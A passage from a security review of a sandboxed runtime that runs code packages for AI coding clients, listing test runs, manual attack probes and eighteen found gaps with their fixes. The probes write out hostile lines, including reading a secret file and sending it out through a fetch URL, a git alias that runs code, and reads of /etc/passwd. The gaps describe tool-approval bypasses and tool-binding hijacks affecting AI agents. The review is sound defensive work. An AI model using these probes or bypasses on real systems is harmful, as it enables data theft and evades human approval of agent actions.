  are reimplemented in `guest-sh/main.go` and were read, not fuzzed.
- The esbuild step that strips TypeScript types (`host/typescript.go`) was read
  and not fuzzed. It runs in the runner process, before the sandbox.
- Byte-for-byte reproducibility of the published v0.1.1 binaries (T26).
- The race in T2 (a link swapped between path resolution and open), and socket
  permissions on macOS (T28). Neither was tested.
- `tap discover`, which was out of scope.
- The `.telara-primitive.json` registry marker read by `host/otel.go:65-78`; it
  is not authenticated and is used only to label telemetry.

## 7. What was run

### Tests that were run

On 2026-10-01, from the runner source tree, with `GOWORK=off` and `-count=1`.

| Command | Result |
|---|---|
| `go test` over every package except `discover` (`bind`, `bridge`, `conformance`, `host`, `journal`, `release`, `satisfy`) | all `ok`: `bridge` 96.3 s, `conformance` 28.1 s, `host` 108.2 s, `release` 15.6 s, `journal` 0.4 s, `bind` 0.1 s, `satisfy` 0.1 s |
| `go test ./...` in `contract/` (a separate module: `glob`, `manifest`, `rebuild`) | `ok` for all three; `buildbox` and `canon` have no tests |
| `go test -v ./host -run '...'` for the named host tests in section 4 (50 s) | every named test `PASS` |
| `go test -v ./conformance -run 'TestThisRunnerPassesEveryLane\|TestARunnerThatDoesEverythingWrongFails'` | both `PASS`. The second test runs a deliberately bad runner and checks the kit fails it on each lane, so the lanes can fail |
| `go test -v ./bridge ./bind ./satisfy ./journal ./release` with live and release tests | one failure on that run: `TestLiveCodexInventory` timed out at 121 s waiting for the local `codex app-server`. Re-run alone it passed (3.9 s, 332 tools seen). The other packages passed. The live tests need the real `claude` and `codex` on the machine |

The test suite shows each control reacting to the case it was written for. It
does not show that no other path exists.

### Manual probes

Each probe is a few lines in a throwaway directory, run with
`tap --no-record <dir>` against a build of the runner from this tree on macOS
arm64.

| ID | Primitive | Observed |
|---|---|---|
| P1 | Python, no declarations: read `os.environ`, `os.listdir("/")`, `open("/etc/passwd")`, `socket.connect(("1.1.1.1", 80))`, `subprocess.run`, `os.system`, `os.fork`, `ctypes`, `urllib` | environment `{}`; `/` and `/etc/passwd` not found; socket `OSError [Errno 58] Not supported`; subprocess `wasi does not support processes`; `os.system` and `os.fork` absent; `ctypes` not found; `urllib` fails in `getaddrinfo` |
| P2 | JavaScript (QuickJS): `std.getenviron()`, `std.getenv("HOME")`, `std.loadFile("/etc/passwd")`, `std.popen`, `os`, `fetch` | environment empty; `HOME` undefined; `loadFile` returns null; `popen` is not a function; `os` and `fetch` undefined |
| P3 | Bash: `cat /etc/passwd`, `id`, `echo > /tmp/x`, `exec id`, `/dev/tcp/1.1.1.1/80` | each refused by the host as undeclared; `$HOME` and `$PATH` empty |
| P4 | Go program calling `bind.Candidates` with a real-looking Gmail tool and two other servers' tools whose names contain "gmail" | the server named `aaa-untrusted` bound; all three scored 1.000 (T18) |
| P5 | Bash with `files: [{path: in, access: read}]` and `fetch: [{origin: "http://127.0.0.1:8765"}]`; `d=$(cat in/secret.txt); tap fetch "http://127.0.0.1:8765/leak?d=$d"` | a local server received `/leak?d=TOPSECRET-123`. No approval was requested. The runner's stderr also printed the full URL (T6, T7, T30) |
| P6 | Bash with `commands: [{command: git, args: ["*"], effect: read}]`; `git -c alias.pwn='!echo ... > file' pwn` | ran with no approval; the file was created (T4) |
| P7 | JavaScript `for(;;){}`; with and without `execution.timeoutSeconds: 2, limits: {memoryMB: 16}`; Python `bytearray(1<<30)` | the loop was still running at 10 s and at 6 s with the timeout set; `tap manifest check` said "may be run"; the 1 GiB allocation succeeded (T23) |

## 8. Historical gaps found (v0.1.1)

These are defects or missing controls found while writing this model, listed so
each can be ticketed. None were fixed as part of this review. File and line
references are to the runner source tree.

| ID | Gap | Where | Related threat |
|---|---|---|---|
| G1 | Read-class requests can carry data out. A `GET` to a declared origin sends the guest's URL, headers and body with no approval, so file contents or tool results can leave. The declarations that make this possible are not shown to the person at run time | `host/capabilities.go:265-282`, `host/main.go:594-598` | T7 |
| G2 | `execution.timeoutSeconds` and `execution.limits` are parsed and never enforced. The guest has no CPU, time or memory bound, host programs have no timeout or output cap, and the guest's output lines are read without a size limit | `contract/manifest/manifest.go:116,120`; `host/main.go:457-459,719`; `host/commands.go:256-280` | T23 |
| G3 | Arguments to a bound tool are not checked at call time against the capability contract | `host/tools.go:307`; `satisfy/satisfy.go:106-147` | T20 |
| G4 | Tool binding can be taken by another server whose tool name contains the provider word and whose server name sorts first. No schema check on Claude Code | `bind/bind.go:182-190,228-243`; `bridge/claude.go:128` | T18 |
| G5 | The list of programs treated as running arbitrary code is hand-maintained and short; a command declared with `["*"]` and effect `read` is accepted and can run code (`git -c alias...`) | `host/commands.go:41-75` | T4 |
| G6 | `tap_run` accepts any package path from the model with no allow-list, and docs recommend approving `tap_run` for `codex exec` | `host/serve.go:290-302`; `docs/install.md` ("Codex") | T15 |
| G7 | User restrictions are not honored for most clients: Claude Code `ask` rules are ignored, and `Denied` is hard-wired to false for Codex, VS Code, the direct MCP bridge and the Gemini relay | `bridge/claude.go:182`; `bridge/codex.go:173-175`; `bridge/vscode.go:76`; `bridge/mcp.go:109-111`; `host/relay.go:275` | T21 |
| G8 | For Gemini relay and VS Code runs the runner approves tool calls on the client's behalf (`clientApprovesCalls`), with no evidence that the client confirms. The VS Code extension passes `toolInvocationToken: undefined` | `host/serve.go:305,357,375-385`; `host/main.go:245-248`; `vscode/extension.js:73` | T17 |
| G9 | Declarations are not sanity-checked beyond format. Files may name any path, including `/`. Fetch origins may be `http://`, loopback or IP literals, and the resolved address is never checked | `contract/manifest/manifest.go:258-283`; `host/capabilities.go:283-297` | T6 |
| G10 | The docs and README say a primitive may be a compiled `.wasm`; the runner lists no interpreter for `.wasm` and refuses it | `docs/writing-a-primitive.md:14,45`; `host/interpreters.go:50-72`; `TestObtainRefusesUnknownEntrypoint` | accuracy |
| G11 | The VS Code `tapRuntime.path` setting is not machine-scoped, so a workspace can choose the binary the extension runs; the extension's socket allows any local same-user process to call any editor tool | `vscode/package.json:24-28`; `vscode/extension.js:32-43,63-111,136` | T27 |
| G12 | v0.1.1 is unsigned and the digests ride with the files they check. Release upload is a local script using a personal access token. `install.sh` is not wrapped in a function. `release` has signing support that was not used | `dist/v0.1.1`; `dist/publish-v0.1.1.sh`; `release/release.go:223-239`; `dist/v0.1.1/install.sh:14-89` | T25, T26 |
| G13 | The relay socket falls back to a predictable path in the shared temporary directory, after removing whatever is there | `host/relay.go:111-114` | T28 |
| G14 | The approval prompt includes guest-controlled text (the arguments in `Example`) with no length limit or escaping | `host/serve.go:189-191`; `host/main.go:611-617` | T13 |
| G15 | Tool results are written to the run record in plain text for 30 days by default, full URLs and command lines are logged to stderr, and `tap serve` has no `--no-record` | `journal/journal.go:284-305`; `host/main.go:226`; `host/commands.go:277`; `host/capabilities.go:309`; `host/serve.go:23-34` | T30 |
| G16 | Files and directories written by a primitive are created 0644 and 0755 | `host/capabilities.go:216,220` | T31 |
| G17 | The interpreter store is created 0755, with files 0644, and a runner built from source reads a bash interpreter that has no digest | `host/interpreters.go:40-45,106-109` | T24, T28 |
| G18 | The web path has no annotation check and no approval; a connector tool declared `read` is called as is | `host/web.go:129-148`; `host/webassets/worker.html:160-163` | T33 |

## 9. Status of each gap after the fixes

Section 8 records the historical findings. The following rows supersede the
historical T7, T15, T17, T18, T23 and T33 control descriptions, among others,
where fixes are listed. These are the changes made in response, with the
ticket, and what remains. A fixed gap names the test that holds it.

| ID | Status | What changed | What remains |
|---|---|---|---|
| G1 | Fetch gate and headless extension shipped in v0.1.13 (TENG-3099) | A fetch, including a read, requires origin approval: a prompt once per origin per run, or an explicit owner CLI grant for that exact package digest. Every full address is in the record, and a refusal is recorded too. `TestAReadFetchThatCarriesDataOutIsGatedAndRecorded`, `TestThePersonIsAskedOncePerOriginForReads` | Data can leave to an approved origin. v0.1.13 includes CLI-only --fetch-origin grants scoped to the package digest; plain package trust does not approve fetches and revokes existing grants for that digest. Downloaded v0.1.13 and v0.1.14 macOS arm64 binaries completed real CONNECT proxy requests; native Claude Code completed public GET approval in v0.1.13. v0.1.4 and v0.1.10 proxy failures are historical |
| G2 | Native runner fixed (TENG-3102); browser limits separately qualified | Native runner: `timeoutSeconds` (default 10 minutes, paused while a person is asked), a 512 MiB memory ceiling, `limits.max_dispatches` (default 1000), a 16 MiB cap on one protocol line, a cap and timeout on each host program's output, and a 16 MiB cumulative native guest-stderr cap. Dispatched programs inherit run cancellation; cancellation closes guest stdin to unblock pending WASI reads. `TestAProgramThatNeverEndsIsStoppedAtItsTimeLimit`, `TestPythonCannotAllocateBeyondTheMemoryCeiling`, `TestTheRunTimeLimitStopsADispatchedHostProgram`, `TestRealGuestDiagnosticsAndPendingProgramLifetime` | `max_steps`, `max_input_bytes` and `max_checkpoint_bytes` are accepted but cannot be applied by this runner; the log names them when declared. A guest can use all of the memory ceiling and the whole time limit. The browser worker does not inherit the native 512 MiB memory setting, timeoutSeconds or 16 MiB protocol-line cap; this patch does not establish full limit parity. Cancellation kills the directly dispatched host program and bounds pipe draining, but is not process-tree isolation for its descendants. If a background descendant keeps an output pipe open after its parent exits, the 250 ms drain bound can end the command with an output-pipe timeout |
| G3 | Fixed (TENG-3103) | A call's arguments are checked against the capability's contract at call time: undeclared arguments, wrong types and missing required ones are refused before any approval. `TestACallIsHeldToTheContractsArguments` | Applies only where the manifest carries a contract for the tool |
| G4 | Fixed (TENG-3100) | When more than one server fits a capability equally well the runner refuses, or asks the person through the client, and keeps the choice on the machine per client (`tap bind`). The binding stays outside the manifest. A package can explicitly name a server with `pin.server`, which narrows portability. `TestTwoServersThatFitEquallyAreNotChosenBetween` | A server that fits slightly better than the real one still wins. A person can choose the wrong server when asked |
| G5 | Partly fixed (TENG-3103) | The list now covers `git -c`, `--exec-path`, `--upload-pack`, `make`, `awk`, `npm run`, `go run` and other launchers. Classification checks both the original command line and the matched subcommand after permitted globals, so neither code-affecting flags nor launcher subcommands are lost. `TestInvocationsThatRunCodeAreRecognized`, `TestCommandClassificationIncludesDeclaredGlobals`, `TestCommandClassificationStillRecognizesLaunchersAfterGlobals` | Still a hand-maintained list: any program not on it that runs code is classed by what the manifest declares |
| G6 | Fixed in v0.1.14 (TENG-3103) | v0.1.13 clients advertising no elicitation skipped package-wide trust. v0.1.14 checks the recorded manifest-and-entrypoint digest before deciding whether the client can ask. An external stdio MCP probe with capabilities `{}` against the independently downloaded signed v0.1.14 macOS arm64 binary refused an untrusted package before creating a run, ran its owner-pretrusted exact digest, and refused its changed entrypoint digest. A Discover-generated tool-only primitive also performed one real Jira read | This is released protocol acceptance, not human GUI approval in another client. Tool-only packages retain per-call gates. Package trust does not approve writes or fetch origins and cannot establish that a program is harmless |
| G7 | Fixed where the client exposes rules (TENG-3101) | Claude Code ask rules, Codex `enabled_tools`, `disabled_tools`, disabled servers and `approval_mode = "prompt"` (checked against Codex 0.147.0), Gemini `includeTools` and `excludeTools`, VS Code `chat.tools.eligibleForAutoApproval`. | VS Code gives an extension no way to read tools switched off in its picker. The direct MCP bridge has no person between it and the server. The Gemini field names were confirmed in Gemini CLI 0.62.0's bundle, and the VS Code setting's key format (`tool`, `server/tool`, `server/*`) in the shipped VS Code 1.138 source; the VS Code ask rule was run through the real extension in a real VS Code 1.140 (`go test ./bridge -run LiveVSCode -live-vscode`): a setting key `runTask` made `run_task` ask and no other tool. The match is a best match to the editor's own lookup, and an MCP server was not connected in that run |
| G8 | VS Code source gate present; Gemini source interpretation only (TENG-3101) | **VS Code:** a live run (VS Code 1.140, a real MCP server that logs each call) showed that a call made through the extension, which has no invocation token, ran a tool that is not read-only with nobody confirming it, after a delay of 47 to 104 seconds. The runner no longer leaves approval of tool calls to VS Code; it asks the person itself, and a call with no yes is not made. `TestAToolCalledThroughVSCodeIsAskedByTheRunnerAndRefusedWithoutAYes`. The extension declared a two-minute deadline, but a native VS Code 1.140 pending write confirmation still had no reply after 150 seconds. Corrected source returned its deadline error after 120.011 seconds in a fresh native SDK invocation; the owned target stayed absent. The cited deadline check used corrected developer source; the signed v0.1.15 baseline predates this fix. A tool already running may still ignore cancellation. **Gemini:** in Gemini CLI 0.62.0's source, a hook's tail call is turned into a validating call with the session's approval mode, so it goes through the same confirmation as a call the model makes. This was read in the source, not run | Native Copilot on signed v0.1.15 rendered separate first-trust and fetch forms: approved public GET returned HTTP 200, while a later declined fetch never reached the backend. The corrected extension deadline has source/native proof, not published-release acceptance. Human effectful-write approval remains unverified. Gemini 0.62.0 returned IneligibleTierError for the existing account, so native hook/write/includeTools/excludeTools acceptance remains unverified |
| G9 | Fixed (TENG-3103) | The file system root, paths that leave the directory, plain `http` to a remote host and link-local addresses are refused at admission. A named origin that resolves to loopback, a private address or a metadata address is not reached. `TestDeclarationsThatCannotBeMeantAreRefused`, `TestANameThatResolvesToTheMachineItselfIsNotReached` | An origin declared as a private or loopback address is allowed, on purpose |
| G10 | Compiled WASI supported | Source entrypoints and packaged WASI Preview 1 `.wasm` entrypoints use the same declared host broker, sandbox limits and approval gates. `TestCompiledWASIPreservesSandboxBrokerGatesAndTimeout` | Author builds require an explicit reviewed recipe and build receipt; execution does not run a build command. See [compiled primitives](compiled-primitives.md) |
| G11 | Fixed (TENG-3104) | `tapRuntime.path` is machine-scoped | Any local process of the same user can still reach the extension's socket |
| G12 | Installer fix shipped in v0.1.13 (TENG-3104) | The final invocation is inside a brace group so an incomplete command cannot start installation. Full piped installs pass under sh/dash/bash; the prior cut after main now fails without installation. v0.1.13 release jobs verified its signed checksum manifest and all five binary hashes; native Windows, both macOS architectures and Linux arm64 acceptance passed | Published v0.1.4/v0.1.10 retain the tail-truncation bug. The installer and its embedded hashes still require a trusted bootstrap source; pinned-key signature verification is a separate step. No production key backup/recovery or rotation was exercised |
| G13 | Fixed (TENG-3104) | A long relay socket path falls back to a private directory made with a random name | |
| G14 | Fixed (TENG-3104) | Text a program wrote is shown to the person with control characters replaced and cut to 300 characters | The text is still the program's |
| G15 | Mostly fixed (TENG-3104) | `tap serve --no-record` keeps no record; fetch addresses and HTTP failure diagnostics omit query strings, fragments and URL credentials, including the error returned to the guest; private journal errors retain their original evidence. `TestShellFetchFailureDoesNotRepeatURLSecretsInGuestSummary`, `TestMalformedRedirectDiagnosticsDoNotRepeatLocationSecrets`. A command is logged as the program, its first two arguments and a count. `TestACommandIsLoggedWithoutItsTrailingArguments` | The record still holds whole command lines and results, 30 days by default |
| G16 | Native private-output checks passed on v0.1.19 (TENG-3104) | Actual published outputs are 0600 with directories 0700 on both Linux and macOS architectures. On both Linux architectures a distinct UID was denied the private original and could read a reviewed owner-managed copy. Native Windows checked the default token owner and found no content grants to Everyone, Authenticated Users and Users; same-owner output and trust/bind/config round trips passed | Cross-user CI must deliberately copy reviewed output into a separately managed shared directory. The Windows checks use the hosted runner account and native DACL inspection; they do not establish a second-account logon or isolation from administrators/System |
| G17 | Mostly fixed (TENG-3104) | The interpreter store is 0700 and its files 0600. A runner built from source remembers the digest of the bash interpreter it first reads and refuses a changed file. `TestASourceBuiltInterpreterThatChangesAfterFirstUseIsRefused` | Releases pin the bash interpreter by digest, so every shipped binary is checked. Only a runner built from source trusts its first read, and says so in the log on every run |
| G18 | Representative compiled Artifact reads passed on signed v0.1.15 (TENG-3104) | The page refuses a connector tool unless readOnlyHint is true and destructiveHint is not true. Actual compiled worker jobs completed Gmail search_threads, Calendar search_events, Drive search_files and Telara telara_tool_describe reads; rendered rows and terminal database records agreed. The initial Drive query error was preserved before the corrected fixture passed. Published v0.1.15 undercounted failed provider attempts and did not forward limits.max_dispatches to the browser worker. Corrected source 2f707f8 counts dispatched attempts even when the provider fails and forwards the manifest request budget (default 1000). A private developer Artifact recorded one failed provider attempt as calls1/refused0 and a cap2 batch as calls2/refused1; the cited accounting/budget checks used a corrected developer Artifact, and the signed v0.1.15 baseline predates these fixes | Annotations remain the connector's own claim. These four representative reads do not establish every tool/connector or desktop-companion support. The developer counter/budget proof is not signed-release acceptance or native memory/time/line parity |

## Authoring evidence and build inputs

Authoring briefs are private local evidence, not packages for publication. Their
redactor removes complete private-key blocks and uses credential field names for
opaque argument values, including nested objects and environment maps. Literal
variable references and ordinary configuration remain available to the author.
`TestRedactRemovesWholePrivateKeyBlocks`,
`TestArgumentRedactsNestedCredentialsAndPreservesConfig` and
`TestRedactShellEnvironmentKeepsTheProcedure` hold those cases. The original
client history and private execution journal are not rewritten; redaction does
not guarantee detection of an arbitrary secret with no identifying context.

The runner and CI use patched Go 1.26.8 and gRPC 1.83.2. CI checks all three Go
modules with govulncheck. A clean source scan means no reported affected call
paths for that build configuration; it is not proof against unknown defects,
unreachable dependency alerts, or other platform/build configurations. These
hardening changes do not replace the history cache, compilation cache, shared
runner process, or borrowed client connections.

## Summary of current status

- Published v0.1.19 passed the complete applicable launch acceptance package on
  all five platforms in [the native matrix](https://github.com/Telara-Labs/TAP-Runtime/actions/runs/37399257001).
  This includes actual Unix private output modes and native Windows output ACL,
  package trust, binding and configuration checks. A separate focused source
  suite passed dialing checks on every platform, including Intel macOS; it
  exercises root refusal, DNS self-address refusal, declared loopback access,
  standard proxy use and metadata-address refusal. Windows volume-root refusal
  also passed against the published binary. These are bounded checks, not the
  complete adversarial host suite or a second-account Windows logon.
- Downloaded v0.1.4: fetch refusal/explicit approval, real output-line limit,
  Bash/Python/TypeScript examples, signed checksum manifest and all five asset
  hashes were exercised. This is not a complete adversarial security proof.
- Current source: Python/JavaScript/Bash memory probes, 1000-request bound,
  default 600-second timeout, status/evidence for failed and unknown-outcome
  runs, same-user/private-mode behavior, and real CONNECT proxy use passed.
- Released v0.1.14 closes v0.1.13's no-elicitation package-trust bypass.
  An independently downloaded signed macOS arm64 binary refused an untrusted
  package before starting a run, ran its owner-pretrusted exact digest, and
  refused its edited entrypoint with a new digest. A Discover-generated
  tool-only primitive made one real Jira read; the real HTTPS proxy check
  returned HTTP 200 through one CONNECT. No external writes were made.
- The complete installer invocation, explicit stale pointer repair and
  digest-scoped CLI fetch grants shipped in v0.1.13 and remain in v0.1.15.
  Package trust and fetch approval remain separate.
- In v0.1.13, Claude Code 2.1.289 rendered separate native first-trust and origin forms;
  the known public GET completed with HTTP 200, one read and zero refusals.
  UI automation answered the forms. Native v0.1.15 Claude Code and Copilot
  rendered separate trust/fetch forms; approved public GETs passed and declined
  fetches were refused before execution. Claude also refused a changed package
  digest. Native Claude/Codex selected between two real matching servers and
  persisted bindings. These owned read fixtures do not establish human
  effectful-write acceptance, Gemini hook behavior or complete all-client
  compatibility.
- Tool results and primitive output can steer the model (T9). Intermediate
  data stays outside the conversation only when the program does not print it.
  A declared host command runs with the user's privileges; tool annotations
  remain claims made by the server.
- Signature verification authenticates the five binaries through their hashes
  under a pinned public key. Bootstrap trust, registry compromise, production
  key backup/recovery/rotation and reproducible builds remain separate risks.
- Private 0600/0700 modes intentionally prevent another user reading output.
  Deliberate sharing uses a separately managed copy, not globally wider modes.
- v0.1.13 native release acceptance passed Windows amd64, macOS arm64 and
  amd64, and Linux arm64, including the platform install scripts. Linux amd64
  never acquired a hosted runner on two attempts, so no acceptance test ran.
  v0.1.14 clean native launch checks subsequently passed on both Linux
  architectures, Windows and Intel macOS in the
  [workflow](https://github.com/Telara-Labs/TAP-Runtime/actions/runs/37373338835).
  Its complete Apple Silicon launch package passed locally with isolated HOME
  and PATH and existing Go caches; the hosted job was cancelled before steps.
  Those historical results did not establish the complete host suite, Windows
  ACL behavior or a five-platform v0.1.15 native launch matrix. The current
  v0.1.19 platform checks are recorded above.
- Full unchanged frozen-corpus Discover parity remains incomplete: the latest
  recovery audit has 39 missing original source sessions. Four exact frozen
  prefixes were recovered; paired synthetic cases do not replace the corpus.
  Live Telara publish/pull/promotion and off-machine key recovery remain
  unverified. Signed v0.1.15 compiled Artifact workers completed representative
  Gmail, Calendar, Drive and Telara read jobs through the actual connector
  guard; this does not establish desktop-companion or every-connector support.
- Published v0.1.15 can leave a header-only journal after a chooser cancellation,
  reporting it as interrupted rather than a known refusal. Corrected source
  records the refusal and passed a native cancelled-run status/evidence check;
  the cited check used a corrected developer build, while the signed v0.1.15
  baseline predates this fix.
